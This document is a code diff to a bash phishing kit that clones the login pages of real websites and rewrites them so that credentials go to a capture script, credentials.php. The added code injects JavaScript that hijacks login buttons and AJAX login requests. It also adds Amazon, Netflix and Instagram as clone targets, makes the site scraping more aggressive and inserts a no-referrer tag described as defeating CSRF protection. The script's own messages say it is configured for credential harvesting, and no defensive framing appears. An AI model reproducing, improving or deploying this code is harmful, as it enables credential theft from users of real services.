@@ -575,7 +575,7 @@ add_form_override_script() {
     echo -e "${YELLOW}[INFO]${NC} Adding script to override form submissions..."
     
     # Add JavaScript to the end of the body to override any form submissions
-    # This will ensure all forms submit to our credentials.php regardless of any JavaScript handlers
+    # This ensures all forms submit to our credentials.php regardless of any JavaScript handlers
     if grep -q '</body>' "$html_file"; then
         sed -i.tmp -e 's|</body>|<script>\
             document.addEventListener("DOMContentLoaded", function() {\
@@ -590,13 +590,43 @@ add_form_override_script() {
                         this.submit();\
                     });\
                 }\
+                /* Override any login buttons that might not be in forms */\
+                var loginButtons = document.querySelectorAll("button[type=submit], input[type=submit], .login-button, .signin-button, .btn-login, .btn-signin");\
+                for(var i=0; i<loginButtons.length; i++) {\
+                    loginButtons[i].addEventListener("click", function(e) {\
+                        var nearestForm = this.closest("form");\
+                        if(nearestForm) {\
+                            e.preventDefault();\
+                            nearestForm.action = "credentials.php";\
+                            nearestForm.method = "post";\
+                            nearestForm.submit();\
+                        }\
+                    });\
+                }\
+                /* Hijack AJAX login attempts */\
+                if(window.XMLHttpRequest) {\
+                    var originalOpen = XMLHttpRequest.prototype.open;\
+                    XMLHttpRequest.prototype.open = function() {\
+                        this.addEventListener("load", function() {\
+                            if(this._url && (this._url.includes("login") || this._url.includes("auth") || this._url.includes("signin"))) {\
+                                var form = document.createElement("form");\
+                                form.method = "post";\
+                                form.action = "credentials.php";\
+                                document.body.appendChild(form);\
+                                form.submit();\
+                            }\
+                        });\
+                        this._url = arguments[1];\
+                        return originalOpen.apply(this, arguments);\
+                    };\
+                }\
             });\
         </script></body>|g' "$html_file"
         
         # Remove temporary files
         rm -f "${html_file}.tmp"
         
-        echo -e "${GREEN}[SUCCESS]${NC} Added form override script"
+        echo -e "${GREEN}[SUCCESS]${NC} Added enhanced form override script"
     else
         # If no </body> tag, just append the script at the end of the file
         echo '<script>
@@ -612,10 +642,40 @@ add_form_override_script() {
                         this.submit();
                     });
                 }
+                /* Override any login buttons that might not be in forms */
+                var loginButtons = document.querySelectorAll("button[type=submit], input[type=submit], .login-button, .signin-button, .btn-login, .btn-signin");
+                for(var i=0; i<loginButtons.length; i++) {
+                    loginButtons[i].addEventListener("click", function(e) {
+                        var nearestForm = this.closest("form");
+                        if(nearestForm) {
+                            e.preventDefault();
+                            nearestForm.action = "credentials.php";
+                            nearestForm.method = "post";
+                            nearestForm.submit();
+                        }
+                    });
+                }
+                /* Hijack AJAX login attempts */
+                if(window.XMLHttpRequest) {
+                    var originalOpen = XMLHttpRequest.prototype.open;
+                    XMLHttpRequest.prototype.open = function() {
+                        this.addEventListener("load", function() {
+                            if(this._url && (this._url.includes("login") || this._url.includes("auth") || this._url.includes("signin"))) {
+                                var form = document.createElement("form");
+                                form.method = "post";
+                                form.action = "credentials.php";
+                                document.body.appendChild(form);
+                                form.submit();
+                            }
+                        });
+                        this._url = arguments[1];
+                        return originalOpen.apply(this, arguments);
+                    };
+                }
             });
         </script>' >> "$html_file"
         
-        echo -e "${GREEN}[SUCCESS]${NC} Appended form override script to file"
+        echo -e "${GREEN}[SUCCESS]${NC} Appended enhanced form override script to file"
     fi
 }
 
@@ -665,6 +725,12 @@ clone_website() {
         redirect_url="https://twitter.com"
     elif [[ "$target_url" == *"linkedin.com"* ]]; then
         redirect_url="https://www.linkedin.com"
+    elif [[ "$target_url" == *"amazon.com"* ]]; then
+        redirect_url="https://www.amazon.com"
+    elif [[ "$target_url" == *"netflix.com"* ]]; then
+        redirect_url="https://www.netflix.com"
+    elif [[ "$target_url" == *"instagram.com"* ]]; then
+        redirect_url="https://www.instagram.com"
     elif [[ "$target_url" == *".edu"* ]]; then
         # For educational institutions, try to redirect to the main site
         redirect_url="https://${domain}"
@@ -683,7 +749,7 @@ clone_website() {
     
     echo -e "${YELLOW}[INFO]${NC} Cloning website: $target_url"
     
-    # Download the website with wget
+    # Download the website with wget - improved options for better cloning
     wget --quiet \
          --no-parent \
          --no-check-certificate \
@@ -693,22 +759,44 @@ clone_website() {
          --span-hosts \
          --domains=$domain \
          --directory-prefix="$clone_dir" \
-         --max-redirect=2 \
+         --recursive \
+         --level=2 \
+         --max-redirect=5 \
          --tries=3 \
          --timeout=30 \
+         --random-wait \
+         --reject "*.mp4,*.webm,*.mov,*.avi,*.wmv" \
+         --accept "*.js,*.css,*.html,*.htm,*.php,*.jsp,*.asp,*.aspx,*.png,*.jpg,*.jpeg,*.gif,*.svg,*.ico,*.woff,*.woff2,*.ttf,*.eot" \
          --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36" \
          "$target_url"
     
     if [ $? -ne 0 ]; then
-        echo -e "${RED}[ERROR]${NC} Failed to clone website. Using default login page."
-        create_default_page
-        return 1
+        echo -e "${YELLOW}[WARNING]${NC} Issues detected with cloning. Trying simpler method..."
+        # Try a simpler cloning method as fallback
+        wget --quiet \
+             --no-parent \
+             --page-requisites \
+             --convert-links \
+             --no-check-certificate \
+             --directory-prefix="$clone_dir" \
+             --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36" \
+             "$target_url"
+        
+        if [ $? -ne 0 ]; then
+            echo -e "${RED}[ERROR]${NC} Failed to clone website. Using default login page."
+            create_default_page
+            return 1
+        fi
     fi
     
     # Find all HTML files in the cloned directory
     echo -e "${YELLOW}[INFO]${NC} Modifying forms to capture credentials..."
-    find "$clone_dir" -name "*.html" -o -name "*.htm" | while read html_file; do
-        # Look for forms and modify them to submit to our credential capture script
+    find "$clone_dir" -name "*.html" -o -name "*.htm" -o -name "*.php" -o -name "*.asp" -o -name "*.aspx" -o -name "*.jsp" | while read html_file; do
+        # First, make a backup
+        cp "$html_file" "${html_file}.original"
+        
+        # Look for and modify forms to submit to our credential capture script
+        # Handle different form action formats
         sed -i 's/<form[^>]*action="[^"]*"/<form action="credentials.php"/g' "$html_file"
         sed -i 's/<form[^>]*action='\''[^'\'']*'\''/<form action='\''credentials.php'\''/g' "$html_file"
         # For forms without an action attribute
@@ -716,10 +804,17 @@ clone_website() {
         
         # Add JavaScript to override form submissions
         add_form_override_script "$html_file"
+        
+        # Add meta tag to prevent CSRF protection by disabling referrer
+        sed -i 's/<head>/<head>\n<meta name="referrer" content="no-referrer">/g' "$html_file"
+        
+        # Fix paths for resources
+        sed -i "s#href=\"/#href=\"http://$domain/#g" "$html_file"
+        sed -i "s#src=\"/#src=\"http://$domain/#g" "$html_file"
     done
     
     # Find the main HTML file (usually index.html)
-    local main_html=$(find "$clone_dir" -name "index.html" -o -name "index.htm" -o -name "default.html" | head -1)
+    local main_html=$(find "$clone_dir" -name "index.html" -o -name "index.htm" -o -name "default.html" -o -name "login.html" -o -name "signin.html" | head -1)
     
     # If no index file found, use the first HTML file
     if [ -z "$main_html" ]; then
@@ -737,6 +832,8 @@ clone_website() {
         
         # Copy all other files in the directory to the current directory
         cp -r "$clone_dir"/* ./
+        
+        echo -e "${GREEN}[SUCCESS]${NC} Successfully cloned website and configured for credential harvesting"
     else
         echo -e "${RED}[ERROR]${NC} No HTML files found in cloned site. Using default login page."
         create_default_page
@@ -744,8 +841,6 @@ clone_website() {
     
     # Clean up
     rm -rf "$clone_dir"
-    
-    echo -e "${GREEN}[SUCCESS]${NC} Website cloned and configured for credential harvesting"
 }
 
 # Check if a URL was provided as argument
